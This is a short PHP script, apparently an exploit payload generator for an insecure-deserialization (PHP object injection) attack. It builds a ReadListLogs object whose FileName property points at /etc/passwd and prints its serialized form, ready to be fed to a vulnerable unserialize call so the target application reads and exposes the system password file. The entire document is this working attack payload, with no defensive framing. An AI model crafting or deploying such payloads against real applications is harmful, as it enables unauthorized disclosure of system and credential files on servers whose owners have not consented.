<?php

class ReadListLogs
{
	public function __construct()
	{
		$this->FileName="/etc/passwd";
		$this->RowNumber = 1;
	}
}

$obj = new ReadListLogs();
echo serialize($obj);
echo "\n";

?>
